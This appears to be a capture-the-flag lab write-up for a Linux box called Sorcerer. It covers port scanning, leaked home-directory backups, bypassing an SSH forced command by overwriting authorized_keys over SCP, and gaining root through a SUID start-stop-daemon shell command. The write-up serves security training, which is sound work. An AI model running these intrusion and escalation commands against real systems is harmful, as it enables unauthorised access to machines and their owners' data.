#Linux #NFS #SSH #SCPWrapper #SUID #GTFOBins #start-stop-daemon

## Overview

Sorcerer is a Linux box built around a creative SSH restriction bypass. Exposed NFS shares leak user home directories as ZIP files, one of which contains an SSH private key locked behind an `scp_wrapper.sh` forced command that blocks interactive shell access. The trick is uploading a modified `authorized_keys` that strips the wrapper restriction, using the same key over SCP to overwrite it. From there, a SUID `start-stop-daemon` binary is a trivial GTFOBins escalation to root.

## Recon

### Port Scan

```sh
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian
80/tcp    open  http    nginx
111/tcp   open  rpcbind
2049/tcp  open  nfs     3-4 (RPC #100003)
7742/tcp  open  http    nginx
8080/tcp  open  http    Apache Tomcat 7.0.4
34541/tcp open  mountd
34965/tcp open  nlockmgr
```

Two web ports and NFS are the interesting findings. Port 7742 hosts the real application; port 8080 runs Apache Tomcat 7.0.4 (old, worth noting).

### Web Enumeration

The port 7742 landing page was a login portal with no working default credentials. Gobuster found two directories:

```sh
gobuster dir -u http://192.168.176.100:7742/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt
/default   (Status: 301)
/zipfiles  (Status: 301)
```

`/zipfiles` immediately surfaces four archives:

```
francis.zip
max.zip
miriam.zip
sofia.zip
```

These are user home directory backups.

## Foothold

### SSH Key Recovery from Leaked Home Directory

Max's archive contained the most useful material:

```sh
ls -lah ~/home/max
drwxr-xr-x  .ssh/
-rwxr-xr-x  scp_wrapper.sh
-rw-r--r--  tomcat-users.xml.bak
```

The `.ssh/` directory held Max's private key. The `authorized_keys` file, however, had a forced command applied:

```
no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/home/max/scp_wrapper.sh" ssh-rsa AAAA...
```

> **How forced commands restrict SSH:** `authorized_keys` can bind a key to a specific command with the `command=` option. When that key authenticates, the server runs *only* that command instead of a shell. The `no-pty` flag also blocks TTY allocation, so even if the forced command were a shell it wouldn't be interactive. This is a common lockdown pattern for service accounts, but it only works if the `authorized_keys` file itself is protected.

The restriction is only enforced while the original `authorized_keys` is in place. Because the key is usable for SCP, I can overwrite the file.

### Bypassing the SCP Restriction

Steps:
1. Copy Max's `id_rsa` private key locally.
2. Create a new `authorized_keys` containing the same public key *without* the `command=` restriction.
3. Use SCP with the original key to overwrite `max's` `authorized_keys`:

```sh
chmod 600 id_rsa
scp -i id_rsa -O authorized_keys max@192.168.176.100:/home/max/.ssh/authorized_keys
```

> **Why `-O` matters here:** newer OpenSSH clients default to SFTP protocol for SCP. The forced command on the server only handles the legacy SCP protocol, so adding `-O` (force legacy mode) ensures the upload actually succeeds rather than stalling on an SFTP negotiation the server won't honor.

SSH now opens a full interactive shell:

```sh
ssh -i id_rsa max@192.168.176.100
max@sorcerer:~$ whoami
max
```

## Privilege Escalation

### SUID start-stop-daemon

Enumerating SUID and SGID binaries:

```sh
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
-rwsr-xr-x 1 root root 44200 Jun  3  2019 /usr/sbin/start-stop-daemon
```

`start-stop-daemon` has a GTFOBins entry. It manages daemon processes and can be told to execute an arbitrary command as its payload, inheriting the SUID context:

```sh
/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
# whoami
root
```

> **Why `start-stop-daemon` escalates privileges:** the binary is SUID root, meaning the OS runs it with root's effective UID regardless of who calls it. GTFOBins documents that its `-x` flag specifies the executable to start, and the `--` separator passes arguments to that binary. The `-p` flag opens a privileged shell. Because the SUID bit transfers to the spawned process, `/bin/sh` runs as root.

## Root

```sh
# cat proof.txt
‹redacted›

# find / -type f -name "local.txt" 2>/dev/null
/home/dennis/local.txt
```

## Takeaways

- **NFS-exposed home directories are treasure chests.** Even read-only leakage of `.ssh/` directories can give SSH access when the key material is present.
- **`authorized_keys` forced commands are only as secure as the file's write permissions.** If SCP can overwrite the file, the restriction evaporates.
- **Run `find` for SUID binaries and cross-reference GTFOBins immediately.** `start-stop-daemon` is a common find on older Debian/Ubuntu systems and goes root in one command.
